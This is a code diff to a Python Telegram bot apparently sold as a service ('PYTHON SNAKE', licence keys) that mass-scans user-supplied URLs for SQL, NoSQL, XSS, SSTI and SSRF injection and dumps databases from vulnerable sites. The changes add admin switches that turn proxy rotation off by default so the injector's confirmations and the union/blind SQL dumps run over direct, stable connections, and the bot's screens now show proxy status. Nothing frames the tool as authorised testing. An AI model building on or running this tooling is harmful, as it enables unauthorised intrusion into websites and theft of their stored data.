@@ -71,8 +71,8 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.15.0"
-BUILD = "yield-mode"   # feature flags — /ping me dikhte hain
+VERSION = "v2.16.0"
+BUILD = "direct-tools"   # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
@@ -3190,6 +3190,19 @@ INJ_STYLE = {"SQLi": "💉", "NoSQL": "🍃", "GraphQL": "🕸", "XSS": "🧪", 
              "SSTI": "🧬", "SSRF": "🌐", "OPEN REDIRECT": "↪️"}
 
 
+def inj_proxy_on() -> bool:
+    """INJECTOR proxy — DEFAULT OFF.
+
+    Free rotating proxy har request naya IP deta hai → injector ka 2nd-request
+    confirmation aur baseline compare galat ho jate hain (false positive).
+    Direct IP par hi sabse saaf result aata hai. Admin: /batch injproxy 1
+    """
+    try:
+        return str(sget("inj_proxy", 0) or 0).lower() in ("1", "true", "on", "yes")
+    except Exception:
+        return False
+
+
 async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                    timeout: float = 8.0, conc: int = 40,
                    max_targets: int = 0) -> dict:
@@ -3284,10 +3297,10 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
         st["took"] = 0.0
         return st
 
-    _use_proxy = bool(proxy_available()) and str(
-        sget("inj_proxy", 0) or 0).lower() in ("1", "true", "on", "yes")
+    _use_proxy = bool(proxy_available()) and inj_proxy_on()
     rot = ProxyRotator(enabled=_use_proxy)
     st["proxy"] = rot.stats()
+    st["proxy_on"] = bool(rot.enabled and len(rot))
     workers = max(4, min(64, int(conc or 40)))
     st["workers"] = workers
     q = asyncio.Queue()
@@ -3366,6 +3379,7 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                     # proxy hi kharab hai → 25 fail par direct pe switch
                     if px_stat["fail"] >= 25 and px_stat["ok"] < 5 and rot.enabled:
                         rot.enabled = False
+                        st["proxy_on"] = False
                         logger.warning("inj: proxies dead (%d fail) → direct mode",
                                        px_stat["fail"])
                 async with lock:
@@ -8356,6 +8370,8 @@ async def cb_inj_go(update, context):
            + B("Or send a file") + "\n" + P(".txt / .csv / .json / .xlsx — every URL inside")
            + "\n\n" + KV("Probes", "<code>%d</code> per parameter" % len(inj_probes_for(cat)), "🔍")
            + "\n" + KV("Max per URL", "<code>%s</code>" % fmt(int(sget("inj_targets", 24) or 24)), "🎯")
+           + "\n" + KV("Proxy", ("<b>OFF — direct</b> (fast + blocks nahi)"
+                                  if not inj_proxy_on() else "<b>ON</b> (free proxies — slow)"), "🧅")
            + "\n\n" + P("Only vulnerable URLs come back — clean pages are dropped."))
     try:
         await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
@@ -8526,6 +8542,8 @@ async def _run_inject(update, context, urls):
             + "🌐 URLs scanned: <code>%s</code> (clean <code>%s</code>)\n" % (fmt(st["urls_done"]), fmt(clean))
             + "🧪 Requests: <code>%s</code> · ⚡ <code>%.1f req/s</code>\n" % (fmt(st["tested"]), speed)
             + "🚫 Blocked: <code>%s</code>\n" % fmt(st["blocked"])
+            + "🧅 Proxy: <b>%s</b>\n" % (("ON — %s alive" % fmt((st.get("proxy") or {}).get("alive", 0)))
+                                         if st.get("proxy_on") else "OFF — direct")
             + ("⚠️ Unverified: <code>%s</code> (2nd check fail — confidence low)\n"
                % fmt(st["suspected"]) if st.get("suspected") else "")
             + ("💀 Dead hosts skipped: <code>%s</code>\n" % fmt(st.get("hosts_dead", 0))
@@ -10258,6 +10276,20 @@ def sqli_report_text(res: dict) -> list:
     return L_
 
 
+def dump_proxy_on() -> bool:
+    """Dumper proxy — DEFAULT OFF.
+
+    SQL dump me session/IP same rehna zaroori hai (union/blind extraction
+    me har request ka jawab pichhle pe depend karta hai). Free rotating proxy
+    har request naya IP deta hai → dump tootta hai. Isliye direct.
+    Chahiye to admin: /batch dumpproxy 1
+    """
+    try:
+        return str(sget("dump_proxy", 0) or 0).lower() in ("1", "true", "on", "yes")
+    except Exception:
+        return False
+
+
 async def sqli_dump(urls: list, targets=None, caps=None, timeout: float = 8.0,
                     conc: int = 3, progress=None, uid=None) -> dict:
     """Saare URLs ka dump — live progress ke saath."""
@@ -10265,8 +10297,9 @@ async def sqli_dump(urls: list, targets=None, caps=None, timeout: float = 8.0,
     caps = caps or {}
     st = {"urls": len(urls), "done": 0, "results": [], "rows": 0, "tables": 0,
           "injectable": 0, "start": time.time(), "stage": "start", "stage_info": "",
-          "stopped": 0}
-    rot = ProxyRotator(enabled=proxy_available())
+          "stopped": 0, "proxy": False}
+    rot = ProxyRotator(enabled=bool(dump_proxy_on() and proxy_available()))
+    st["proxy"] = rot.enabled
     sem = asyncio.Semaphore(max(1, min(8, conc)))
     lock = asyncio.Lock()
     conn = mk_connector(limit=max(4, conc + 2), force_close=True)
@@ -10355,8 +10388,9 @@ async def dump_harvest(urls: list, progress=None, uid=None, timeout: float = 10.
     """Har URL fetch karo aur data nikaalo — asli network, rot proxy priority."""
     urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
     st = {"urls": len(urls), "done": 0, "records": [], "errors": 0,
-          "start": time.time(), "stopped": 0}
-    rot = ProxyRotator(enabled=proxy_available())
+          "start": time.time(), "stopped": 0, "proxy": False}
+    rot = ProxyRotator(enabled=bool(dump_proxy_on() and proxy_available()))
+    st["proxy"] = rot.enabled
     sem = asyncio.Semaphore(max(2, min(40, conc)))
     lock = asyncio.Lock()
     conn = mk_connector(limit=max(6, conc), force_close=True)
@@ -10473,7 +10507,10 @@ async def tool_dump(update, context):
            + KV("Tables / URL", "<code>%s</code>" % fmt(caps["tables"]), "🗃") + "\n"
            + KV("Rows / table", "<code>%s</code>" % fmt(caps["rows"]), "📄") + "\n"
            + KV("Blind mode", "on (if page prints nothing)", "🙈") + "\n"
-           + KV("Request cap", "<code>%s</code> per URL" % fmt(caps["requests"]), "🔋") + "\n\n"
+           + KV("Request cap", "<code>%s</code> per URL" % fmt(caps["requests"]), "🔋") + "\n"
+           + KV("Proxy", "<b>OFF — direct</b> (dump me session same rehna zaroori hai)"
+              if not dump_proxy_on() else "<b>ON</b> — <code>/batch dumpproxy 0</code> se band karo",
+              "🧅") + "\n\n"
            + B("You get") + "\n"
            + P("one report per URL (DB, tables, columns, rows) + all_rows.csv + zip.")
            + "\n\n<code>https://target.com/product.php?id=5</code>")
@@ -13297,6 +13334,7 @@ BATCH_KEYS = {
     "injconc": ("inj_conc", 5, 200, "Injector parallel requests", 30, "⚡"),
     "injtime": ("inj_timeout", 3, 30, "Injector request timeout (s)", 6, "⏱"),
     "injproxy": ("inj_proxy", 0, 1, "Injector: proxy use (0=off, 1=on)", 0, "🧅"),
+    "dumpproxy": ("dump_proxy", 0, 1, "Dumper: proxy use (0=off, 1=on)", 0, "🧅"),
     "dumpconc": ("dump_conc", 2, 60, "Dumper parallel pages", 12, "📄"),
     "dumptime": ("dump_timeout", 5, 45, "Dumper page timeout (s)", 10, "⌛"),
     "dumptables": ("dump_tables", 1, 100, "Dump: tables per URL", 8, "🗃"),
@@ -13335,6 +13373,7 @@ def batch_card() -> str:
             "<code>/batch injtargets 36</code> — injector tests per URL\n"
             "<code>/batch injconc 30</code> · <code>/batch injtime 6</code>\n"
             "<code>/batch injproxy 0</code> — 0 = direct (tez), 1 = free proxies\n"
+            "<code>/batch dumpproxy 0</code> — 0 = direct (dump tootta nahi)\n"
             "<code>/batch dumpconc 12</code> · <code>/batch dumptime 10</code>\n"
             "<code>/batch dumptables 15</code> · <code>/batch dumprows 50</code>\n"
             "<code>/batch dumpblind 1</code> · <code>/batch dumpreq 800</code>\n"
